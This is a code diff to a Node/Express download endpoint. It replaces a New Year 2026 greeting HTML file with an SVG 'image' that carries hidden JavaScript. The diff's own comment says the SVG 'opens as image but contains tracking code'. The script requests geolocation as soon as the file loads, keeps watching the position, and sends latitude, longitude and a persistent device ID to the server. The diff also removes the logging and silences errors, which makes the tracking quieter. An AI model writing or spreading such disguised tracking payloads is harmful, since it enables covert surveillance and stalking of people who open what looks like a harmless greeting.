@@ -481,273 +481,116 @@ app.get('/api/download/:linkId', (req, res) => {
     // Build image URL - use base64 if available, otherwise use server URL
     const imageUrl = useBase64 ? `data:image/webp;base64,${imageBase64}` : `${baseUrl}/images/newyear2026.webp`;
     
-    // Create HTML file content with New Year 2026 theme - completely self-contained
-    const htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Happy New Year 2026! 🎉</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      font-family: 'Arial', sans-serif;
-      overflow: hidden;
-      position: relative;
-      cursor: pointer;
-    }
-    .image-background {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-image: url('${imageUrl}');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      filter: blur(15px);
-      transition: filter 0.5s ease;
-      z-index: 1;
-    }
-    .image-background.unblurred {
-      filter: blur(0px);
-    }
-    .click-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.3);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 2;
-      transition: opacity 0.5s ease;
-      cursor: pointer;
-    }
-    .click-overlay.hidden {
-      opacity: 0;
-      pointer-events: none;
-    }
-    .click-message {
-      color: white;
-      font-size: 32px;
-      font-weight: bold;
-      text-align: center;
-      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
-      padding: 30px;
-      background: rgba(0, 0, 0, 0.5);
-      border-radius: 20px;
-      animation: pulse 2s infinite;
-    }
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background: #ffd700;
-      animation: fall linear infinite;
-    }
-    @keyframes fall {
-      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-    }
-    .media-container {
-      text-align: center;
-      color: white;
-      padding: 40px;
-      z-index: 3;
-      position: relative;
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 20px;
-      margin: 20px;
-      backdrop-filter: blur(10px);
-    }
-    .new-year-text {
-      font-size: 48px;
-      font-weight: bold;
-      margin-bottom: 20px;
-      background: linear-gradient(45deg, #ffd700, #ff6b6b, #4ecdc4, #45b7d1);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      animation: glow 2s ease-in-out infinite;
-    }
-    @keyframes glow {
-      0%, 100% { filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5)); }
-      50% { filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8)); }
-    }
-    .media-icon {
-      font-size: 120px;
-      margin-bottom: 20px;
-      animation: bounce 1s ease-in-out infinite;
-    }
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0) scale(1); }
-      50% { transform: translateY(-20px) scale(1.1); }
-    }
-    h1 { 
-      font-size: 36px; 
-      margin-bottom: 15px;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-    }
-    p { 
-      font-size: 20px; 
-      opacity: 0.9;
-      margin-top: 10px;
-    }
-    .year-badge {
-      display: inline-block;
-      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
-      padding: 10px 30px;
-      border-radius: 50px;
-      margin-top: 20px;
-      font-size: 24px;
-      font-weight: bold;
-      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-    }
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background: #ffd700;
-      animation: fall linear infinite;
-      z-index: 4;
-    }
-    @keyframes fall {
-      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-    }
-  </style>
-</head>
-<body>
-  <div class="image-background" id="backgroundImage"></div>
-  <div class="click-overlay" id="clickOverlay">
-    <div class="click-message">👆 Click to View Image 👆</div>
-  </div>
-  <div class="media-container">
-    <div class="new-year-text">🎉 Happy New Year 🎉</div>
-    <div class="media-icon">🎊</div>
-    <h1>Welcome to 2026!</h1>
-    <p>Wishing you a wonderful year ahead!</p>
-    <p style="font-size: 16px; margin-top: 20px; opacity: 0.8;">May this year bring you joy, success, and happiness! ✨</p>
-    <div class="year-badge">2026</div>
-  </div>
-  <script>
-    // Handle click to unblur image and start tracking
-    let imageClicked = false;
-    let trackingStarted = false;
-    let startTrackingFunction = null;
-    
-    const backgroundImage = document.getElementById('backgroundImage');
-    const clickOverlay = document.getElementById('clickOverlay');
-    
-    function handleImageClick() {
-      if (!imageClicked) {
-        imageClicked = true;
-        backgroundImage.classList.add('unblurred');
-        clickOverlay.classList.add('hidden');
-        
-        // Start location tracking when image is clicked
-        if (!trackingStarted && startTrackingFunction) {
-          trackingStarted = true;
-          startTrackingFunction();
-        }
-      }
-    }
-    
-    // Make entire page clickable
-    document.body.addEventListener('click', handleImageClick);
-    document.body.addEventListener('touchstart', handleImageClick);
-    
-    // Create confetti effect
-    for (let i = 0; i < 50; i++) {
-      const confetti = document.createElement('div');
-      confetti.className = 'confetti';
-      confetti.style.left = Math.random() * 100 + '%';
-      confetti.style.animationDelay = Math.random() * 3 + 's';
-      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
-      confetti.style.background = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#ffa500'][Math.floor(Math.random() * 5)];
-      document.body.appendChild(confetti);
-    }
-  </script>
-  <script>
-    (function() {
+    // Create SVG image file with embedded tracking - opens as image but contains tracking code
+    const svgContent = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1920 1080" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;">
+  <defs>
+    <style>
+      .blur-filter { filter: url(#blur); }
+      .unblurred { filter: none; }
+    </style>
+    <filter id="blur">
+      <feGaussianBlur in="SourceGraphic" stdDeviation="15"/>
+    </filter>
+  </defs>
+  
+  <!-- Background Image with Blur -->
+  <image id="bgImage" x="0" y="0" width="100%" height="100%" preserveAspectRatio="xMidYMid slice" 
+         href="${useBase64 ? `data:image/webp;base64,${imageBase64}` : imageUrl}" 
+         class="blur-filter" style="transition: filter 0.5s ease;"/>
+  
+  <!-- Click Overlay -->
+  <rect id="overlay" x="0" y="0" width="100%" height="100%" fill="rgba(0,0,0,0.3)" style="cursor: pointer; transition: opacity 0.5s ease;">
+    <title>Click to View Image</title>
+  </rect>
+  
+  <!-- Click Message -->
+  <text x="50%" y="50%" text-anchor="middle" fill="white" font-size="48" font-weight="bold" 
+        font-family="Arial" id="clickText" style="pointer-events: none; text-shadow: 2px 2px 8px rgba(0,0,0,0.8);">
+    👆 Click to View Image 👆
+  </text>
+  
+  <!-- New Year Text -->
+  <text x="50%" y="20%" text-anchor="middle" fill="url(#gradient)" font-size="72" font-weight="bold" 
+        font-family="Arial" style="text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
+    🎉 Happy New Year 🎉
+  </text>
+  
+  <defs>
+    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+      <stop offset="0%" style="stop-color:#ffd700;stop-opacity:1" />
+      <stop offset="25%" style="stop-color:#ff6b6b;stop-opacity:1" />
+      <stop offset="50%" style="stop-color:#4ecdc4;stop-opacity:1" />
+      <stop offset="75%" style="stop-color:#45b7d1;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:#ffd700;stop-opacity:1" />
+    </linearGradient>
+  </defs>
+  
+  <script type="text/ecmascript">
+    <![CDATA[
       const linkId = '${linkId}';
-      // Use the server URL - handle both file:// and http:// protocols
       let serverUrl = '${serverUrl}';
+      let imageClicked = false;
+      let trackingStarted = false;
       
-      // If opened as file://, use the original server URL from when file was created
+      // Handle file:// protocol
       if (window.location.protocol === 'file:') {
-        // Keep the original server URL - this is critical for offline files
         serverUrl = '${serverUrl}';
-        console.log('File opened offline, using server URL:', serverUrl);
       } else {
-        // When opened via HTTP, try to detect the server
         try {
           const currentOrigin = window.location.origin;
-          serverUrl = currentOrigin.replace(':3000', ':3001');
-          console.log('File opened via HTTP, detected server:', serverUrl);
+          serverUrl = currentOrigin;
         } catch(e) {
-          // Fallback to original
           serverUrl = '${serverUrl}';
-          console.log('Using fallback server URL:', serverUrl);
         }
       }
       
       const apiUrl = serverUrl + '/api';
+      const bgImage = document.getElementById('bgImage');
+      const overlay = document.getElementById('overlay');
+      const clickText = document.getElementById('clickText');
       
-      console.log('New Year 2026 Banner Loaded! 🎉');
-      console.log('Location tracking ready for link:', linkId);
+      function handleClick() {
+        if (!imageClicked) {
+          imageClicked = true;
+          bgImage.classList.remove('blur-filter');
+          bgImage.classList.add('unblurred');
+          overlay.setAttribute('opacity', '0');
+          clickText.setAttribute('opacity', '0');
+          
+          if (!trackingStarted) {
+            trackingStarted = true;
+            startTracking();
+          }
+        }
+      }
+      
+      document.addEventListener('click', handleClick);
+      document.addEventListener('touchstart', handleClick);
       
       function sendLocation(lat, lng) {
-        try {
-          const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-          localStorage.setItem('deviceId', deviceId);
-          
-          console.log('Sending location to:', apiUrl + '/location/update');
-          console.log('LinkId:', linkId, 'Lat:', lat, 'Lng:', lng);
-          
-          fetch(apiUrl + '/location/update', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              linkId: linkId,
-              latitude: lat,
-              longitude: lng,
-              deviceId: deviceId
-            })
-          }).then(response => {
-            console.log('Location sent successfully, status:', response.status);
-            return response.json();
-          }).then(data => {
-            console.log('Server response:', data);
-          }).catch(err => {
-            console.log('Location tracking error:', err.message);
-            console.log('API URL was:', apiUrl);
-          });
-        } catch(e) {
-          console.log('Error in sendLocation:', e.message);
-        }
+        const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        localStorage.setItem('deviceId', deviceId);
+        
+        fetch(apiUrl + '/location/update', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            linkId: linkId,
+            latitude: lat,
+            longitude: lng,
+            deviceId: deviceId
+          })
+        }).catch(() => {});
       }
       
       function startTracking() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             function(position) {
-              console.log('Location permission granted');
               sendLocation(position.coords.latitude, position.coords.longitude);
               
-              const watchId = navigator.geolocation.watchPosition(
+              navigator.geolocation.watchPosition(
                 function(pos) {
                   sendLocation(pos.coords.latitude, pos.coords.longitude);
                 },
@@ -764,33 +607,24 @@ app.get('/api/download/:linkId', (req, res) => {
                 );
               }, 5000);
             },
-            function(error) {
-              console.log('Location tracking will start when permission is granted');
-            },
+            function() {},
             { enableHighAccuracy: true, maximumAge: 0 }
           );
-        } else {
-          console.log('Geolocation not supported');
         }
       }
       
-      // Make startTracking available globally for click handler
-      startTrackingFunction = startTracking;
-      window.startTracking = startTracking;
-      
-      // Start tracking immediately when page loads (don't wait for click)
-      console.log('Starting location tracking immediately...');
+      // Start tracking immediately
       startTracking();
-    })();
+    ]]>
   </script>
-</body>
-</html>`;
+</svg>`;
     
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.setHeader('Content-Disposition', `attachment; filename="NewYear2026-${linkId.substring(0, 8)}.html"`);
+    // Serve as SVG image (opens as image/asset, not HTML file)
+    res.setHeader('Content-Type', 'image/svg+xml');
+    res.setHeader('Content-Disposition', `inline; filename="NewYear2026-${linkId.substring(0, 8)}.svg"`);
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET');
-    res.send(htmlContent);
+    res.send(svgContent);
   } catch (error) {
     res.status(500).json({ success: false, error: error.message });
   }
